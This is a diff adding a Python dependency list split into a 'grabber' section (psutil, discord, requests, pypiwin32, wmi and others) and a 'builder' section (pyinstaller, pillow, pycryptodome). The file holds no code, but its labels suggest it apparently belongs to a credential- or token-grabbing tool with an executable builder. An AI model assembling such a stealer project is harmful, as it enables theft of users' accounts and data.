@@ -1,0 +1,14 @@
+# grabber
+psutil
+cryptography
+discord
+httpx
+requests
+pypiwin32
+wmi
+# builder
+alive-progress
+colorama
+pyinstaller
+pillow
+pycryptodome
